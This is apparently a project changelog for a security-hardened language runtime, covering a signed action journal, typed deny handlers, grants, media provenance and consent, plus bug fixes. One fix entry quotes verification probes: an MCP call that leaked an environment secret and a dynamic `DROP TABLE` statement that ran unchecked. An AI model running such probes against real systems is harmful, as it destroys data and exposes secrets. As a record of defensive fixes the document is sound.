- **Action Ledger v1 — signed append-only journal of actions (naryad #393, issue #487, wave 3)**: the INTEGRITY upgrade the grant ledger promised — every action now leaves a prev-hash-chained, Ed25519-signed record (`src/ledger.rs`, `ed25519-dalek`, ADR-0167). Every record is signed (the head signature is the last record's; `hash = SHA-256` over the canonical body), signer continuity is enforced across key rotations (a `key_rotation` record is signed by the still-active key and names the taking-over key), and `snapshot` records pin the head for anchored archival. The writes are SIDE EFFECTS of the action paths themselves (ADR-0167 §3.4) — grant lifecycle events (`grant.issued/subgranted/consumed/revoked/used`, inside `grants.rs::record_event`), runtime deny events (`deny.<REASON>`, written BEFORE handler selection in both `fire_on_deny` TW and `vm_fire_on_deny` VM), successful irreversible actions (`irreversible.db_execute`, post-success in `db_execute_with_grant`), and HTTP session lifecycle (`session.create/destroy`, feature `server`). Confidentiality: metadata and argument HASHES only — payloads never enter the journal; write failures on action paths are loud stderr, never a silent pass and never a DoS lever. Language surface (registry 451→457, appended; №316 classification rows): `ledger_count()` / `ledger_head()` (reads, not egress), `ledger_export(path)` (FILE EGRESS — the verifiable JSONL chain, classified Sink), `ledger_export_intoto(path)` (FILE EGRESS — the in-toto Statement profile, ADR-0157 filled from its reserved booking), `ledger_rotate()`, `ledger_snapshot()`. The external verifier needs NO runtime: `mlog ledger verify <file> [--expect-head …] [--expect-key …]` checks seq continuity, chain links, hashes, key ids, every signature, rotation seams and snapshot anchoring; `mlog ledger archive <file> <out> --at <seq>` truncates at a snapshot anchor (verified before written). Evidence: `tests/naryad_393_ledger.rs` (12 tests — enumerated single-byte flips break verification at every position, deletion/reordering/truncation detected, key substitution and the fresh-key full rewrite caught by the anchors per the honest §7 boundary, rotation/snapshot/archive, in-toto shape, TW+VM deny integration, grant/irreversible auto-journaling); the 10k-record golden (sign + external verify < 10 s, release-only) is a new blocking CI job `ledger-golden`; `fuzz_target_ledger_tamper` joins fuzz-smoke (panic freedom + soundness of the tamper contract over arbitrary input). Example: `w2_ledger` (grant + deny → full trail → rotate/snapshot/export). Honest boundary (ADR-0167 §7): tamper-EVIDENT, not tamper-PROOF — a full rewrite under a fresh key is caught only against the out-of-band head/key anchors; post-host-compromise write integrity is out of scope. One new top-level dependency (`ed25519-dalek`; sha2/hex/rand were present) — within the FEATURE_INTAKE §5 budget. README/ci.yml blocking-jobs counter resynced (15→19: voice-tests, video-tests and ledger-golden were missing from the stale badge).

- **DenyEvent — typed denials with on_deny handlers (naryad #392, issue #486, wave 3)**: a runtime security refusal is now a typed event instead of a dead end. `on_deny(<sink-class|*>) { ... }` declares a handler (the eight №325 sink classes or `*`; exact class wins over the wildcard); inside, `deny_event()` returns the `DenyEvent` struct (`reason`, `sink`, `class`, `argument`, `label`, `line`, `human`) and `deny_reason()` the reason word. The reason vocabulary is the audit check_id SSOT — the seven core classes (`VOICE_EGRESS_UNCONSENTED`, `IRREVERSIBLE_NO_GRANT`, `UNTRUSTED_EXEC_DECISION`, `SECRET_TO_EXEC`, `SECRET_EGRESS_VCS`, `SECRET_EGRESS_NETWORK`, `PII_EGRESS_NETWORK`) plus the extending pair, the generic `SINK_CLEARANCE`, and the legacy corpus classes — so the static gate, the runtime twin and the event agree verbatim. Double protection: the handler runs AFTER the verdict, can log/notify/degrade and can never re-allow; a handled refusal continues with a degraded `Unit` (the refused call never executes); without a covering handler the loud default is unchanged. The analyzer adds a new capability — Match exhaustiveness over a known enum: a `match deny_reason()` missing a reason without an `else` arm is a compile error listing the unhandled set (`[DENY_MATCH_EXHAUSTIVE]`), unknown reason literals are `[DENY_MATCH_UNKNOWN]`, handler-scope violations are `[DENY_HANDLER_SCOPE]`, and the run path blocks on all `[DENY_` errors. Runtime deny sources: the VM sink-clearance twin and grant refusals on `db_execute_with_grant` (typed `GRANT_*` detail rides in `human`; the reason class stays `IRREVERSIBLE_NO_GRANT`). TW and VM agree on the handled path (parity pinned). Registry 447→449 (two handler-scoped stubs, appended at the END — the CallBuiltin index contract is untouched). Examples: `w2_deny_exhaustive` (green) + `w2_deny_incomplete` (red). REFERENCE §2.9.

- **The data ↔ action bridge (naryad #391, issue #485, wave 3)**: for the six ACTION sinks (`exec`, `exec_argv`, `git_push`, `http_post`, `send_message`, `db_execute`) the №325 clearance gate now enforces BOTH lattice axes on the decision argument — confidentiality `label.conf ⊑ public` AND integrity `label.integrity ≥ trusted` — table-driven (`semantic::ACTION_BRIDGE`, documented in REFERENCE §2 and threat-model Boundary 1). The gap it closes: an untrusted URL driving `git_push` was not gated before (`UNTRUSTED_EGRESS_NETWORK` now fires there; the leak corpus pins it as `n391_git_push_untrusted_url`). The specialized classes keep their names — old reds stay red (contract-tested: `UNTRUSTED_EXEC_DECISION`, `SECRET_TO_EXEC`, `SECRET_EGRESS_VCS`, `SECRET_EGRESS_NETWORK`, `IRREVERSIBLE_NO_GRANT`). Every deny is explainable: argument index, sink, label, both thresholds and the failed one (`reason` travels on `SinkViolation` — the surface №392 DenyEvent consumes). Grants (№390) are orthogonal: the grant authorizes the action, the bridge gates the data; `db_execute_with_grant` is not a №325 sink. Green side pinned by `ok_391_trusted_actions`.

- **Grant value — the ADR-0155 algebra implemented (naryad #390, issue #484, wave 3)**: `Value::Grant` — an opaque capability handle (non-printable, non-serializable; serde emits a dead `[GRANT]` marker) over the grant ledger (the `consent_ledger` pattern; the SSOT for class/quota/revocation state). Builtins (append-only, registry 442→447): `grant_issue(scope, ttl, class?, uses?)`, `grant_subgrant(parent, scope, ttl, class?, uses?)` (attenuation-only — narrower scope, shorter TTL, lower class power; a Once parent is consumed by the split; an N(n) parent is debited by the child quota), `grant_revoke(g)` (cascading), `grant_use(g)` (metered consumption), and `db_execute_with_grant(g, sql, params?)` — the granted destructive-SQL action on BOTH backends (ledger state, TTL, scope coverage of the destructive ops, quota — enforced at runtime; consumption only after success). The static half: `GRANT_REUSED` — a Once grant consumed twice in one body is a compile error (flow walk with branch-intersection merge; move `let g2 = g` flagged; exclusive if/else uses legal). The ungranted deny is unchanged (`IRREVERSIBLE_NO_GRANT`, fail-closed). Fuzzing: `tests/grant_algebra_fuzz.rs` — 4000 differential ops against an independent model, zero amplification. REFERENCE §4.15.1 + classification rows (№316 SSOT); README claims resynced (447 builtins / 42 modules / 231 examples / ~242 KB).

- **ADR-0155 Grant algebra — accepted (naryad #389, issue #483, wave 3)**: the reserved 0155 slot is filled with the decision on permissions for irreversible operations — three grant classes (**Once** — statically linear, move semantics, reuse = `GRANT_REUSED`; **N(n)** — runtime quota metered in the ledger, exhaustion = `GRANT_EXHAUSTED`; **Unlimited** — copyable, every use audited via the `⟨io, audit⟩` effect trail), linearity rules 1–6 (no copy except Unlimited, no serialization, no outliving the revoking context, attenuation-only subgrant, cascading revoke, unchanged fail-closed default), the sink-class mapping over the №316 SSOT inventory (`db_execute` destructive / `exec` / `git_push` / `http_post` / `send_message`), the typed error surface for #390–#392, the ledger state model on the `consent_ledger` pattern (signing is #393), prior art with take/leave conclusions (macaroons, Biscuit, UCAN, Cedar — position: a profile over language-level linear values, not a token format), and the AND-composition interface with the label lattice (data gate first, action gate second — bridge is #391). `IRREVERSIBLE_NO_GRANT` remains the default deny; no compatibility profile can weaken this gate. Documentation-only change.

- **All repository documentation English-only + `docs_language_lint` CI gate (naryad #383, issue #477)**: per the owner directive (2026-09-17), every `.md` in the repo is technical English — 41 inventory files translated (root triplet `AGENTS.md`/`CLAUDE.md`/`GEMINI.md` kept byte-identical, PR template, README lines, `docs/*.md`, ADRs 0132–0142 + index, 17 `docs/research/*` reports, CHANGELOG historical records, `tree-sitter-mlog/README.md`); the README work-plan digest section removed (the canon stays in `docs/PLAN-SUMMARY.md`); the rule is mechanically enforced by `tests/docs_language_lint.rs` (publisher threshold: >=20 Cyrillic letters AND >2% letter share; frozen allowlist = `docs/adr/0043-unicode-fix.md` where Cyrillic is test data; mutation-checked red/green). Numeric anchors preserved — `readme_consistency`/`reference_consistency`/`registry_sync_check` green; the CHANGELOG size claim resynced (~312 KB).

- **Stage 4 real-load benchmark (naryad #381, issue #467, ADR-0141 §D5)**: a production-class corpus (`benches/fixtures/production_workload.mlog`, 2344 lines, FOSVED-like helpdesk — 14 routes over mock-LLM/vision/voice I/O, in-memory SQLite, kv, match/if/each/while/try DSL, path-template routes; deterministic-mock only, sanitize 0) plus a two-process harness (`benches/stage4_benchmark.rs`, `cargo bench --bench stage4_benchmark`): 30 request cycles × 14 routes per backend, per-route p50/p95/mean, peak RSS, startup split (parse+semantic vs VM compile), a DSL-only diagnostic, raw JSON report, and the loud §D5 verdict. Result: request-cycle mean speedup ×1.67–×1.95 across runs, no memory win → **INSUFFICIENT DATA — the default flip is NOT justified by this data** (the decision goes back to the owner re-gate with the numbers). The corpus contract (≥2000 lines, sanitize 0, Category-A clean, VM-compilable, route parity on both backends) is pinned in `tests/naryad_381_stage4_corpus.rs`.

### Fixed

- **TW-serve route bodies could not use `from <origin> media_store_*` — the per-request interpreter never saw the origin declarations (bug gh#544, found by the №402 pin test)**: `Interpreter::clone_definitions_into` propagated every definition class EXCEPT `origin_decls`, so a route body's provenance chain — `let frame = from archive_cam media_store_image(…)` — failed loud at runtime with `media_bind_origin: unknown origin 'archive_cam' (no origin declaration in this program)` (HTTP 500), while the SAME program worked on the VM backend (`Vm::load_program` registers `program.origin_decls` per request) and at the TW top level (the declaration pass populates `origin_decls` directly — which is why the wave-3 kitchen-camera e2e never saw this). The layer-vs-layer disagreement in the №328 spirit: `mlog check` was green, the serve runtime was not. Fix: `clone_definitions_into` now propagates `origin_decls` with the same merge discipline as every other definition class — union, first-wins on the name, idempotent across the startup chain's per-declaration merges (the №399 lesson). Per-request store isolation is untouched: `media_store` stays a per-interpreter `Mutex<MediaStore>` and a fresh per-request interpreter still starts empty. This unblocks the office dogfood contour (№395, gh#489 — the office runs TW-serve): any future office route with a media chain now reaches the wave-3 capability layer. Evidence: `tests/naryad_544_tw_serve_origin.rs` (3 tests — the gh#544 repro green on the TW interpreter backend with the bound handle in the response, VM-backend parity on the same program pinned, and the per-request fresh-store contract pinned via the handle counter `[Image#0]` on BOTH requests — a shared store would shift the second request to `[Image#1]`).

- **MCP tool methods leaked process env and ran unchecked tool files — the two live findings of the №401 external verification (bug gh#536)**: the №259 env gate is `ExecContext::ServeRoute`-scoped, and `mcp-serve` executed tool method bodies in the Process context, so `tools/call secrets.peek {"key":"METALOGOS_MCP401_PROBE"}` returned the live probe value over HTTP (`isError=false`) — a tool method is operator-authored, but the MCP client calling it is not, and a method that copies env content into its result leaks process secrets to the caller (the exact №259 shape in a new context; the documented header contract overstated the reality). And `mcp-serve` only PARSED the file — the front door (`mlog check`) refuses a literal `DROP TABLE` (`IRREVERSIBLE_NO_GRANT`) and dynamic SQL (`SQL_DYNAMIC`), but a tool file that was never checked ran tool bodies unchecked on the interpreter path: the live probe `db_execute("DROP TABLE " + table)` executed until the SQL layer refused (`SQL_ERROR: no such table`), with the VM-side `SINK_CLEARANCE_RUNTIME` backstop unreachable from the interpreter execution. Fix, no new error codes (the frozen №385 set): (1) tool method bodies execute under the SAME `ServeRouteExecGuard` thread-local as serve route bodies (the №253-А mechanic) — `env()` is №259-gated (`ENV_NOT_PERMITTED` unless `METALOGOS_SERVE_ALLOW_ENV=1` or the name is in `METALOGOS_ENV_ALLOWLIST`), `exec()` is №253-gated with serve semantics (`METALOGOS_SERVE_ALLOW_EXEC=1`; the process-level `METALOGOS_ALLOW_EXEC` flag does NOT apply — the MCP caller is the untrusted party), and the tool env/exec gate state is loud at startup like the serve posture; (2) every mcp-serve entrypoint (stdio, http/sse, and the test harness) enforces the Category A startup gate (`enforce_category_a_startup`, the №98 `run_server` precedent) — `IRREVERSIBLE_NO_GRANT`, `SQL_DYNAMIC`, `SECRET_LEAK`, … refuse the process loudly with the exact `[CODE] message` lines before any bind, on every transport. Boundary stated honestly: the runtime taint twin (the VM SinkCheck) stays VM-side — the interpreter has no runtime labels (the №405 layer); the startup gate is the TW-side backstop this boundary relies on. Evidence: `tests/naryad_536_mcp_tool_gates.rs` (10 tests — the env leak red→green with the live probe name and sentinel, the allowlist precision pins, the exec replacement-semantics pin, the startup-gate refusals of both live SQL shapes, clean-tool-files-still-serve, and the entrypoint wiring on stdio + http + test harness).

- **Serve dropped the declared on_deny handlers — routes failed loud instead of degrading (naryad #399, bug gh#520, opened by the №395 dogfood, item (д))**: `clone_definitions_into` copied `deny_handlers` by OVERWRITE while server startup (`run_server` / `run_test_server_with_backend_in_dir`) merges one declaration at a time — every non-OnDeny declaration carried an empty handler list and clobbered the handlers accumulated from earlier merges (the №381 db_conn clobber class; handlers survived only when on_deny happened to be the last merged declaration). In live `mlog serve` (TW — the default backend, the office deployment) a route hitting a runtime gate — e.g. the second `db_execute_with_grant` under an exhausted N(1) grant — surfaced as a loud 500 `Handler error: GRANT_EXHAUSTED` instead of the №392 contract (fire_on_deny → handled → degrade to Unit); the wave-3 capability layer was silently weakened in the default serve contour. Fix: union instead of overwrite, idempotent by (class, span) identity — the parser gives every declaration a unique span, so re-merging the same program never duplicates handlers; the non-serve №392 paths (the full pre-pass, the VM `program.deny_handlers` lift) were never affected and are now pinned. Evidence: `tests/naryad_399_serve_on_deny.rs` (the gh#520 repro green in live serve — 200 `b=Unit`, the deny event and the handler output on stderr: `[DENY_EVENT] … handled by on_deny(db)` + `deny caught`; VM parity pin; the compiler pre-pass registering the handler exactly once; the flow-path TW↔VM parity pin) + unit pins `n399_union_not_overwrite` / `n399_merge_idempotent_no_duplicates`.

- **VM `query()` dropped its params list (naryad #381)**: the bytecode backend bound `stmt.query([])` unconditionally — every parameterized query failed with "Wrong number of parameters passed to query. Got 0, needed N" while the tree-walking backend bound them; `db_execute()`/`query_scalar()` stringified params (`Float`→`"3"`, `Bool`→`"true"`) instead of typed binds. All three now share the typed `convert_params` SSOT (caught by the Stage 4 corpus; pinned by unit tests).
- **Server startup clobbered the shared in-memory DB connection (naryad #381)**: `run_server`/`run_test_server_with_backend` build the shared interpreter through a per-declaration merge chain, and `clone_definitions_into` unconditionally assigned `db_conn` — every merge after the `db {}` declaration overwrote the established `sqlite::memory:` connection with `None`, so ALL `query()` calls in route bodies failed with "no database connection" (per-request `reconnect_db()` treats in-memory as "already shared"). The merge now keeps an established connection.

- **Stale VM opt-in warning (naryad #380, issue #466)**: the `METALOGOS_SERVE_BACKEND=vm` startup WARN claimed live Stage 1 limitations ("`match` statements fail to compile, block if/else silently evaluates to Unit") that №369/№370 closed — it loudly discouraged opt-in experiments with restrictions that no longer exist. The WARN now states the truth: experimental opt-in per ADR-0105; full-language parity (Stage 1 gaps closed, Stage 2 crosscheck green, ADR-0141); the default flip is gated (soak + real-load benchmark). Formatting artifacts inside the string literal removed. Historical ADR-0088/ADR-0105 texts untouched (historical accuracy).

### Changed

- **Stage 5 re-gate series executed — NOT flip-ready on the memory criterion; the latency criterion is now met 3/3 (naryad #404, issue #527, protocol №398)**: three consecutive pinned-runner benchmark runs (stage4-benchmark.yml, rounds=30, main @ `fe89aa3`, no env flags — the frozen variant is VM WITHOUT the pool: `Arc<Program>` from №402 is unconditional, the №403 pool is env opt-in with the default OFF per ADR-0141 Addendum 2; runs 35496980866 / 35496984047 / 35496987315, all success; divisor declared before the runs = corpus route count 14): cycle p95 speedup ×3.04 / ×2.50 / ×3.56 — the latency gate (≥ ×1.5) holds on ALL three (№388: ×1.66/×1.62/×1.48, 2/3 — the divisor elimination is confirmed at the p95 level), while the peak-RSS ratio (VM/TW) is 1.136 / 1.143 / 1.129 — the memory gate (≤ ×1.1) fails on ALL three (№388: 1.10/1.09/1.12, 2/3; the clone removal is a latency lever, not a resident-state lever, and the pool is likewise a latency lever). **Verdict: NOT flip-ready** by the fixed two-threshold gate (audit 2026-09-19 P0-1, thresholds unchanged per protocol rule 2); the `mlog serve` default remains the tree-walking interpreter and the VM pool remains opt-in; the flip decision stays with the owner. Series record + raw numbers: `docs/research/naryad-404-stage5-rerun.md`; ADR-0141 Addendum 3 records what holds (parity, soak, latency 3/3) and what does not (memory 0/3 — the VM resident footprint is the next honest lever, a candidate naryad, before a fresh re-gate under the SAME thresholds). Documentation-only change — zero behavior change.

## [0.20.0] - 2026-09-16

**The security model becomes a lattice: every value carries a three-component
label — (conf, integrity, consent-scope) — and the compiler gates egress,
decisions, and downward moves on it (Wave 1, naryads #322–#329, ADR-0154/0156/0161).
The VM backend reaches Stage 1 + Stage 2: `match`, if/else as a value, binop
coercion, PRNG/Bool parity, the parity gate and a nightly soak workflow
(naryads #369–#373). `try` returns a structured result; `adapt` keeps/rolls
back on a real measured metric; interprocedural taint depth is configurable.
395 commits since v0.19.0.**

**BREAKING — `try` returns a structured result (Naryad #374, ADR-0142)**:
`try expr` no longer returns the bare inner value / a bare `Unit` on error.
It returns `Struct { ok: Bool, value: Value, error: Unit | Struct { code, message } }`
on BOTH backends. Old error probes `type_of(r) == "Unit"` / `r == Unit` break —
migrate to `r.ok == false` (mlog has no unary `!`, so `!r.ok` in the ADR text is
pseudocode; the full before/after is REFERENCE.md §Migration). 29 golden examples
were migrated in №374 itself; `.expected` outputs are untouched. Success-path
code is unaffected: `r.value` on `ok == true` carries the inner value with its
type preserved.

### Added — provenance: the C2PA contour of media handles — read/write manifests + the generation guarantee (Naryad #337, P1/feature/provenance, issue #464, ADR-0166)

- **Store entries carry their manifest facts** (`src/media/mod.rs`): `MediaEntry` gains `synthetic: bool` (default `false` — captured/stored bytes are NOT synthetic; a false positive would lie in the opposite direction) and `bytes_sha256` (computed ONCE at insert over the plaintext — sealed payloads are never re-decrypted for provenance reads).
- **Write manifests — the egress sidecar (№241 continuity)**: `media_save` now emits `<path>.manifest.json` next to the bytes — a `MediaManifest { kind, origin, conf, bytes_sha256, synthetic, timestamp }` record built from the ENTRY's facts, so the №332 origin chain and the C2PA record cannot disagree. The sidecar write is part of the SINK: a failed write is a loud error — a manifest-less media egress cannot happen through `media_save`. The returned value stays the path (№331 contract unchanged).
- **The generation guarantee — compile-verified, not only runtime-marked**: a bind whose declared origin kind is `generation` FORCES `synthetic: true` on the bound entry (`bind_origin` has no synthetic parameter to lie about; no builtin writes the field); every legal generation bind is a fresh `media_store_*` construction (№332), so every legal generation handle is marked BY CONSTRUCTION. A generation bind over a non-construction does NOT compile, and the refusal NAMES the contract: "a GENERATION lift sets synthetic: true on the new store entry (ADR-0166 §2.3); binding an existing handle would skip or falsify the Art. 50 marking".
- **Read manifests — provenance without materialization**: `media_manifest(handle)` returns `Struct { kind, origin, conf, synthetic, bytes_sha256, refs, sealed }` (state-carrying, interpreter/VM interception); `media_manifest_read(path)` parses a sidecar from the sandbox — missing/empty/corrupt manifests are LOUD refusals (the №320 posture), and a manifest WITHOUT the `synthetic` field reads `true` (conservative, unknown ⇒ marked — pre-№337 sidecars stay readable).
- Registry 440→442 (`media_manifest`, `media_manifest_read`, category `media`); №316 SSOT classification (Source/Public/Pure, Source/Internal/Pure); `scripts/gen_classification.py`: `media` and `registry` join RISKY_CATEGORIES (their manual rows carry real rationales the Pure default would destroy on regeneration — found and prevented during №336/№337).
- `examples/w1_c2pa_egress.mlog` (capture → egress → read-back: `synthetic: false`; generation → egress → read-back: `synthetic: true`, both backends); `tests/naryad_337_c2pa_handles.rs` (7 tests). Wave 2 acceptance item 6 closed: generation lifts are REQUIRED to set synthetic: true — at compile time.

### Added — registry: BackendSelect — the backend ladder and Degraded(t) (Naryad #336, P1/feature/registry, issue #463, ADR-0165)

- **`backend_select(class, ladder)`** — the backend try-chain over the №333 registry SSOT: walks the ladder in priority order (list order = priority), picks the FIRST available rung, and returns `Struct { type_name: "BackendSelected", ok: true, backend, weights_id, mode, attempts }` — mode is `"mock"` or `"real"`, never hidden. Both backends through the shared registry dispatch (VM parity for free). Registry 439→440 (category `registry`).
- **`Degraded(t)` — typed degradation** (the Wave 2 Go/No-Go item 5): when every rung is unavailable the result is `Struct { type_name: "Degraded", ok: false, class: <t>, attempts, error: Struct { code: "BACKEND_DEGRADED", message } }` — NOT a panic and NOT a silent mock substitution. The stable code `BACKEND_DEGRADED` follows the ADR-0131/0140 convention; `ok: false` matches the try-struct (ADR-0142) guard convention (`if sel.ok`).
- **Every ladder step is an audit event** (№326 posture): a `[BACKEND_SELECT]` stderr line per rung plus the program-visible `attempts` list (`Struct { backend, status: "selected" | "unavailable", reason }`) — the ladder's trace is data, no silent skips.
- **The loud mock boundary**: mock mode (default) makes every registry rung of the requested class available through the deterministic mock-first contract (№334) with `mode: "mock"` visible in the result; REAL mode (`METALOGOS_LLM_MOCK=false/0`) makes a rung available only with fetched, SHA-verified weights — with the №294 PARKED boundary the ladder honestly exhausts to `Degraded`. A mock NEVER substitutes a rung in real mode (tested).
- **Build-time ladder verification** (`profile device { mode: production | development }` joins the compat-profile family): a statically-visible `backend_select` call site is verified against the registry on EVERY compile path (`BACKEND_SELECT_INVALID` — unknown class word / unknown rung / class mismatch / duplicate or empty ladder; `BACKEND_LADDER_UNVERIFIABLE` — under `mode: production` a `ShaPin::PendingNo334` rung is unverifiable and fails COMPILATION, the §11.2 build-time rule with the companion-check precedent). Non-literal ladders stay with the runtime checks. The full §11.2 hardware matrix (memory/accelerator tiers) is a documented boundary — the registry does not carry hardware requirements yet.
- Shape errors (unknown class, empty ladder, duplicate rungs) are loud runtime Errs — catchable by `try` (ADR-0142); exhaustion is a typed value, not an error throw.
- `examples/w1_degrade.mlog` (the full cycle: static ladder → selection; dynamic ladder → exhaustion → Degraded, on both backends); `tests/naryad_336_backend_ladder.rs` (9 tests). `scripts/gen_classification.py` OVERRIDES synced with the manual №331–№335 rows (the generator no longer destroys them on re-run).

### Added — media: unified media handles + the media store (Naryad #331, P0/feature/perception, issue #458, ADR-0162)

- **Four opaque media handle types as language values** — `media_store_image` / `media_store_audio` / `media_store_video_frame` / `media_store_video_segment` return `Value::Media` handles (`[Image#N]`, `[Audio#N]`, `[VideoFrame#N]`, `[VideoSegment#N]`; language types `Image` / `Audio` / `VideoFrame` / `VideoSegment`, ADR-0114 pattern). Bytes NEVER live in `Value` — only an index into the per-interpreter (or per-VM) `MediaStore`. Loud naming boundary: `media::AudioId` (unified store, u64) is distinct from `voice::AudioId` (TTS skeleton registry, u32).
- **Media store** (`src/media/mod.rs`): lazy materialization (nothing decrypts/copies until a sanctioned sink asks), explicit refcount (`media_retain` +1, `media_release` −1, eviction at 0 with sealed buffers zeroized on drop — the №172 contour discipline), `media_meta` observer (`Struct { kind, conf, refs, sealed }` — no bytes leave the store).
- **At-rest sealing**: entries declared `consented`/`private` are AES-256-GCM sealed (same primitive and `nonce‖ciphertext` format as the Phase 7.3 `encrypt()` contour); the 256-bit per-store key lives in `Zeroizing`, is never serialized, and `Debug` never renders key or payload. `poisoned` is deliberately not constructible via the store.
- **Opaque guarantee is a COMPILE error**: any field access on a media-typed expression fails with `MEDIA_HANDLE_OPAQUE` (Category-A Error, audit + `check_program` — the `examples/w1_handle_opaque` contract pair). The grammar cannot even express `.field` on a call result (postfix ops attach to primaries only); aliases of media bindings are tracked and refused identically.
- **Byte egress = one sanctioned sink**: `media_save(handle, path)` — classified Sink (№316 SSOT), file-egress kind in the №325 clearance tables (a private-LABELLED handle is `SECRET_LEAK` at compile time by data flow), plus the runtime backstop `MEDIA_SEALED_EGRESS` (sealed entries refuse materialization — declassification is №326 territory; media policies are a later boundary). Writes go through the io sandbox (`SANDBOX_VIOLATION` discipline).
- Labels work on handles with NO new lattice rules (ADR-0154): the static label of a handle is the join of the producing call's arguments (private data in → private handle out → №325 refuses the egress), and the store entry carries the DECLARED sensitivity (conf axis) for the at-rest decision and the runtime backstop — the №320 static+runtime split.
- Registry 421→429 (8 builtins, new category `media` → 40 modules); REFERENCE regenerated (429/429, 0 TODO(doc)); ADR-0162 written before code.

### Added — perception: consent grant/revoke + quarantine sink + ledger (Naryad #335, P0/feature/perception, issue #462; absorbs №313 v1)

- **Consent surface (builtins, the redact "policy as value" precedent — no new AST nodes)**: `consent_grant(value, scope, subject?, ttl_seconds?)` records (subject, scope, TTL) in the consent ledger and passes the value through with the consent-scope set EXTENDED (static: `semantic.rs label_source`; non-literal scope = conservative no-extension, the redact dynamic-policy posture); `consent_revoke(value, scope?)` records the revocation (scope or `<all>`) and returns the value under the QUARANTINE label.
- **The flat revoke cascade is the LATTICE, not a separate analysis**: the revoked value carries (conf: poisoned, integrity: untrusted, consent: ∅) and poison is ABSORBING in the ADR-0154 lattice — every alias, concatenation and merged branch stays poisoned by the lattice's own join. №322's lattice semantics unchanged.
- **The quarantine sink**: `quarantine_write(value, reason?)` is THE only legal egress for a poisoned value — the №325 clearance exempts exactly this sink; the event is unconditional (program-visible `[QUARANTINE_EGRESS]` return + stderr `[CONSENT][audit-event]` + a Severity::Info `QUARANTINE_EGRESS` finding in the audit report — the №326 posture). Every other sink still refuses poisoned (`SINK_CLEARANCE`).
- **The consent ledger** (`src/consent.rs`, process-local SQLite — the voice consent_ledger precedent generalized; the LOUD decision: one table, two record kinds): grants carry (subject, scope, ttl_seconds, issued_at, expires_at), revocations (scope or `<all>`); `consent_ledger_export(path)` dumps JSON to a sandboxed path — FILE EGRESS, classified Sink, `CONSENT_LEDGER_EXPORT` audit event; `entry_count`/`export_json` are the in-process read API.
- **Registry 435→439** (category `security`, append-only); №316 classification: grant/revoke = Lift (label transforms, no egress), quarantine_write/consent_ledger_export = Sink (audited egress); REFERENCE 439/439 (0 TODO); example `examples/w1_consent_revoke.mlog` + `.expected` (the revoke cascade → quarantine egress with the event in the program output); tests `tests/naryad_335_consent.rs` (12). Boundaries (loud): LikenessToken and full media-taint stay Phase 2; C2PA = №337; capability layer = next phase.

### Added — backends: real STT/omni/vision-understanding — the SHA-pin path (Naryad #334, P0/feature/backends, issue #461)

- **The three №334-scoped backends carry REAL pins** (HF LFS oid == SHA-256 of the file, fetched via the HF tree API 2026-09-16; provenance in every manifest path): `whisper-turbo` (STT, NEW registry entry — openai/whisper-large-v3-turbo, MIT → osi; single-file artifact `model.safetensors`), `nemotron-omni` (omni — nvidia/Nemotron-3-Nano-Omni-30B-A3B-Reasoning-BF16, non-osi; 17 shards), `molmoact2` (vision-understanding — allenai/MolmoAct2, Apache-2.0 → osi; 5 shards). The remaining entries (chatterbox — gated repo, metadata requires auth; kokoro — out of scope; z-image-turbo — the №212 manifest is still `_TODO_` by design until the executor's download; wall-oss — unverified) stay `PendingNo334` honestly: hashes are never fabricated.
- **Per-file weights manifests** (`WEIGHTS_SOURCES`, src/backends.rs): every backend = (repo id, revision, files[(path, sha256, bytes)]); `validate_weights_source` refuses loudly a manifest without valid pins, zero bytes, duplicate or escaping paths — a manifest without SHA is a refusal, never a silent fallback (the weights.rs posture).
- **The loader path** (`src/backends_weights.rs`): `weights_plan` — the dry-run (registry → per-file URL/path/pin/bytes plan; loud on unknown ids, PendingNo334, missing manifest, pin↔manifest disagreement); `fetch_weights` — the REAL fetch: `MLOG_BACKEND_WEIGHTS_ALLOWLIST` default-deny → https-only → SSRF guard with pinned resolves (№130/№261) → download → SHA-256+byte-count verification → write; mismatch = loud Err, file never written, no skip-and-continue; `weights_loaded` — on-disk verification for the real-call path.
- **The mock-first call surface** (registry 432→435): `stt_transcribe(audio, model?)` + `omni_ask(prompt, media?, model?)` (src/voice/backend.rs) and `vision_understand(image, prompt?, model?)` (src/vision/understand.rs). `METALOGOS_LLM_MOCK` default = DETERMINISTIC mock (the golden contract, TW+VM parity); class checks against the №333 registry (an stt call over omni weights refuses loudly); real mode (`METALOGOS_LLM_MOCK=false`) refuses loudly naming the missing artifact and the PARKED boundary (№294) — never a silent mock substitution. №333 license gate keeps priority: naming non-osi weights is refused at audit before any call surface.
- **PARKED (loud)**: real inference is gated on hardware (№294 No-Go — ≥64 GB RAM, ≥40 GB disk, GPU). The turnkey path: `fetch_weights` (allowlist + SHA-pinned) → `METALOGOS_LLM_MOCK=false`. `docs/limitations.md` carries the boundary row; REFERENCE regenerated (435/435, 0 TODO) + №316 classification rows; README claims synced.

### Added — perception: origin declarations + the origin chain (Naryad #332, P0/feature/perception, issue #459, ADR-0164)

- **Perception syntax** (+7 grammar rules, 316→323): `origin <name> { kind: camera|file|generation, media: <kind>, label: public|consented|private, path: "..." }` declares the SOURCE of perception handles (`file` requires `path`; a camera CAPTURE is a loud PARKED boundary at runtime — №294 — while the static chain is unaffected; `poisoned` is not constructible by declaration); `source <origin>` (HandleSource) produces a handle FROM a declared origin; `from <origin> media_store_*(...)` (ProvBind over the Lift) binds the provenance of a NEWLY constructed handle. The §7.4 Sink is `media_save` — no second egress vocabulary.
- **The origin-chain rule is a compile error** `ORIGIN_REQUIRED` (Category-A, always Error, both compile paths — the №331 opacity posture): a bare `media_store_*(...)` is refused ("a handle without origin is not constructed, §7.4"), as are `source`/`from` in illegal positions and direct `media_source_capture`/`media_bind_origin` calls (lowered forms only). Bindings and aliases are tracked, so the chain survives `let alias = img`. Declared-origin shape/vocabulary errors are loud on every path (`ORIGIN_DECL_INVALID`).
- **Origin labels flow into the №325 sink gate**: `source` carries the origin's declared conf; `from` carries the JOIN of the origin label and the construction's data-flow label. The §5.3 kitchen-camera scenario (`label: private` → `media_save`) is denied AT COMPILE TIME with `SECRET_LEAK` naming the sink, the container and the carried label — a static deny with an explainable reason (`examples/w1_kitchen_camera.mlog` + `.error`). Public origins flow through unchanged.
- **Runtime lowering**: `media_source_capture(origin)` (file-backed capture reads the sandboxed path, loud on missing files; camera = PARKED) and `media_bind_origin(origin, handle)` (binds the entry's origin, joins the declared conf, re-seals on a public→non-public transition) — state-carrying, intercepted by interpreter AND VM (registry 430→432, category `media`); `media_meta` exposes `m.origin` — the bound provenance, observable without materializing bytes.
